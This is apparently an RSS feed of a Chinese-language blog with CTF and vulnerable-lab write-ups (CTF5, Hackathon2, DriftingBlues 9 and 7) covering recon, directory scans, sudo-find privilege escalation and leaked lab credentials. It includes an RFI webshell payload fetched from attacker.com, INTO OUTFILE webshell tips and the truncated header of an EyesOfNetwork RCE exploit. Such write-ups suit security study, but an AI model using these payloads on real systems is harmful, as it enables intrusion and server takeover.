+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cwww&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;bassam&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;aziz&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;supersecret&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;aziz&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt; &lt;span class="n"&gt;su&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;bassamsu&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;bassamPassword&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Password123&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="c1"&gt;#bassam@bassam-aziz:~$&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;尝试进行提权,这里进行sudo提权，发现这里面只有find有权限&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cbassam@bassam-aziz:~$ sudo -lsudo -l[sudo] password for bassam: Password123!@#Matching Defaults entries for bassam on bassam-aziz: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser bassam may run the following commands on bassam-aziz: (ALL : ALL) /usr/bin/find
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来进行尝试 sudo + find 提权&lt;/p&gt;</description></item><item><title>CTF5</title><link>https://luxuryzcx.github.io/posts/ctf5/</link><pubDate>Mon, 15 Jun 2026 20:19:37 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/ctf5/</guid><description>&lt;p&gt;信息搜集&lt;/p&gt;
+&lt;p&gt;发现开的端口巨多&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120215510608.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;看看80&lt;/p&gt;
+&lt;p&gt;发现了登录框&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120220007551.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120215627710.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;来看看一些445端口泄露了什么&lt;/p&gt;
+&lt;p&gt;发现疑似账户&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120220152816.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;连接一下试试看，发现登录失败了&lt;/p&gt;
+&lt;p&gt;那就看其他的突破口来试试，来扫一下目录啥的&lt;/p&gt;
+&lt;p&gt;扫出来了几个敏感目录&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120221709039.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;/events /inc /info.php /list /mail /login.php /phpmyadmin /ChangeLog /README /index.php /squirrelmail&lt;/p&gt;
+&lt;p&gt;这些路径都挨个试一试下&lt;/p&gt;
+&lt;p&gt;有登录页面&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222525804.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;发现这一个泄露了配置文件&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222409411.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;有注册页面&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222455486.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;登录页面&lt;br&gt;
+&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222603657.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;数据库的登录页面&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222630356.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后发现这是一个&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222820911.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;接下来我们用那个nikto来扫描这个网站潜在的漏洞&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;c极高危漏洞 (Critical)这几个漏洞极大概率能让你直接获得服务器权限（Webshell）或数据库权限。1. 远程文件包含 (RFI) / 本地文件包含 (LFI)&amp;gt; + /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&amp;#39;s RFI list. + /index.php: PHP include error may indicate local or remote file inclusion is possible.- 解读：这是扫描报告中最致命的一项。扫描器发现 /info.php 似乎存在文件包含漏洞，并且成功测试了远程包含。 - 利用思路： - GetShell：攻击者可以在自己的服务器上搭建一个包含恶意 PHP 代码的文件（如 shell.txt，内容为 &amp;lt;?php system($_GET&amp;#39;cmd&amp;#39;]); ?&amp;gt;），然后通过 URL http://61.139.2.137/info.php?file=http://attacker.com/shell.txt 让目标服务器去执行它，从而直接拿到 Webshell。 - 读取敏感文件：如果是本地文件包含（LFI），可以尝试读取 /etc/passwd (Linux) 或 C:\Windows\win.ini (Windows)。 2. 敏感配置文件泄露&amp;gt; + /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.- 解读：这通常是编辑器（如 Emacs/Vim）留下的临时备份文件。wp-config.php 是 WordPress 的核心配置文件。 - 利用思路： - 数据库沦陷：直接下载访问 http://61.139.2.137/#wp-config.php#，你可能会看到明文的数据库账号、密码、数据库主机地址以及 WordPress 的认证密钥（Salts）。 - 结合前面的 phpMyAdmin 暴露，可以直接登录数据库改写数据或上传 Webshell。 3. phpMyAdmin 暴露及未授权访问风险&amp;gt; + /phpmyadmin/: phpMyAdmin directory found. + /phpmyadmin/changelog.php ...- 解读：数据库管理后台直接暴露在公网。 - 利用思路： - 弱口令爆破：配合 Hydra 等工具爆破 root 密码。 - 直接登录：如果利用第2点拿到了 wp-config.php 中的数据库密码，可以直接在此处登录，完全控制数据库。 - 写入Webshell：登录后利用 SELECT ... INTO OUTFILE 写入一句话木马拿到服务器权限。 &amp;lt;hr style=&amp;#34;border: 0; border-top: 1px solid #ddd; margin: 20px 0;&amp;#34;&amp;gt;🔴 高危漏洞 (High)1. phpinfo() 信息泄露&amp;gt; + /info.php: Output from the phpinfo() function was found.- 解读：网站上遗留了测试文件。 - 危害： - 泄露了绝对路径（这对文件包含漏洞和写 Webshell 至关重要）。 - 泄露了 PHP 版本、系统版本、已安装的扩展、禁用的函数列表（disable_functions）等，为攻击者定制攻击载荷提供了精确蓝图。 2. 软件版本严重过时&amp;gt; + Server: Apache/2.2.6 (Fedora) + /: Retrieved x-powered-by header: PHP/5.2.4.- 解读： - Apache 2.2.6 发布于 2007 年，PHP 5.2.4 发布于 2007 年。 - 利用思路：这些古董级版本存在大量已知的 CVE 漏洞（如缓冲区溢出等），可以使用 Metasploit 直接搜索对应版本的 Exploit 进行攻击。 3. HTTP TRACE 方法开启 (XST 攻击)&amp;gt; + /: HTTP TRACE method is active which suggests the host is vulnerable to XST.- 危害：允许跨站追踪攻击（Cross-Site Tracing），可能绕过 HttpOnly 标记窃取用户的 Cookie。 &amp;lt;hr style=&amp;#34;border: 0; border-top: 1px solid #ddd; margin: 20px 0;&amp;#34;&amp;gt;🟠 中低危漏洞 (Medium/Low)1. 目录遍历 (Directory Indexing)&amp;gt; + /icons/: Directory indexing found.- 解读：访问 /icons/ 目录会列出所有文件。虽然 icons 目录通常只放图标，但如果发生在上传目录或备份目录，将直接泄露所有文件名。 2. SquirrelMail 暴露&amp;gt; + /squirrelmail/src/read_body.php: SquirrelMail found.- 解读：发现 Web 邮件系统。如果版本过旧，可能存在远程代码执行漏洞。 3. PHP 彩蛋信息泄露&amp;gt; + /?=PHPB8B5F2A0...- 解读：这是 PHP 的一个特性，虽然本身危害不大，但确认了服务器确实在运行 PHP，且未屏蔽此类指纹。
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;[&lt;/p&gt;</description></item><item><title>Hackathon2</title><link>https://luxuryzcx.github.io/posts/hackathon2/</link><pubDate>Mon, 15 Jun 2026 20:18:01 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/hackathon2/</guid><description>&lt;p&gt;扫端口 出现21 和 80 端口&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220183750076.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后尝试匿名登录 发现登录成功&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220183853442.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;get下载到本地 发现第一个flag&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220184024561.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;查看另一个文件，发现与扫目录有关&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220184306539.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;先简单的用 dirsearch 来扫一下 发现啥也没扫出来过&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220192655609.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后我们用指定的字典来扫 发现扫到一个路径 /happy&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220193506532.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;查看网页源代码 发现提示有一个用户名为 hackathonll&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220193602764.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;使用更加详细的命令进行 nmap 扫描 发现了ssh 21端口被修改成了 7223端口&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220194120638.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;我们尝试进行登录，发现登录不行 尝试进行爆破 就用给的那个字典 进行爆破&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220195528422.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后成功找到了一个&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220195603819.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;尝试登录 登录成功&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220195706933.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;尝试进行sudo 提权&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220195858312.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;成功提权&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220200129128.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;拿到第二个flag&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260220200214840.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;</description></item><item><title>DriftingBlues 9</title><link>https://luxuryzcx.github.io/posts/driftingblues-9/</link><pubDate>Mon, 15 Jun 2026 20:17:23 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/driftingblues-9/</guid><description>&lt;h1 id="信息搜集"&gt;信息搜集&lt;/h1&gt;
+&lt;p&gt;只有一个80端口&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227130105080.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;访问 发现关键信息&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227130132400.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;查看页面信息 发现历史的cms漏洞&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227130239724.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后新增加一个域名&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227205740983.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;寻找历史漏洞&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227210052100.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;寻找这个漏洞路径&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227210156687.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h1 id="漏洞利用"&gt;漏洞利用&lt;/h1&gt;
+&lt;p&gt;然后进行执行 看起来是python2 的这个版本的 发现已经执行成功的&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227210833930.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;结合前面的路径扫描 找到 了这个数据库的密码&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227211154616.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt; &lt;span class="c1"&gt;// DATABASE CONNECTION INFORMATION define(&amp;#39;DATABASE_HOST&amp;#39;, &amp;#39;localhost&amp;#39;); // Database host define(&amp;#39;DATABASE_NAME&amp;#39;, &amp;#39;microblog&amp;#39;); // Name of the database to be used define(&amp;#39;DATABASE_USERNAME&amp;#39;, &amp;#39;clapton&amp;#39;); // User name for access to database define(&amp;#39;DATABASE_PASSWORD&amp;#39;, &amp;#39;yaraklitepe&amp;#39;); // Password for access to database define(&amp;#39;DB_ENCRYPT_KEY&amp;#39;, &amp;#39;p52plaiqb8&amp;#39;); // Database encryption key define(&amp;#39;DB_PREFIX&amp;#39;, &amp;#39;mb101_&amp;#39;); // Unique prefix of all table names in the database ?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;clapton yaraklitepe 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id="反弹shell"&gt;反弹shell&lt;/h1&gt;
+&lt;p&gt;命令&lt;/p&gt;</description></item><item><title>DriftingBlues 7</title><link>https://luxuryzcx.github.io/posts/driftingblues-7/</link><pubDate>Mon, 15 Jun 2026 20:16:52 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/driftingblues-7/</guid><description>&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227224220356.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;访问web页面 没什么东西 是一个 cms&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227224308445.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;gobuster dir -u http://61.139.2.144:66 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227232520662.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;curl http://61.139.2.144:66/flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227231906385.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;接下来主要是从80或者443端口入手，扎到CMS的版本，以及相应的漏洞利用脚本：&lt;/p&gt;
+&lt;p&gt;查询EyesOfNetwork 5.1 to 5.3 exploits：&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/h4knet/eonrce"&gt;https://github.com/h4knet/eonrce&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="ch"&gt;#!/bin/env python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# coding: utf8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Exploit Title: EyesOfNetwork 5.3 RCE&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Date: 02/2020&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Exploit Author: Clément Billac - Twitter: @h4knet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Vendor Homepage: https://www.eyesofnetwork.com/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Software Link: http://download.eyesofnetwork.com/EyesOfNetwork-5.3-x86_64-bin.iso&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Version: 5.3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# CVE : CVE-2020-8654, CVE-2020-8655, CVE-2020-8656&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# CVE-2020-8654 - Discovery module to allows to run arbitrary OS commands&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#                 We were able to run the &amp;#39;id&amp;#39; command with the following payload in the target field : &amp;#39;;id #&amp;#39;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# CVE-2020-8655 - LPE via nmap NSE script&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#                 As the apache user is allowed to run nmap as root, we were able to execute arbitrary commands by providing a specially crafted NSE script.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#                 nmap version 6.40 is used and doesn&amp;#39;t have the -c and -e options.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# CVE-2020-8656 - SQLi in API in getApiKey function on &amp;#39;username&amp;#39; field&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
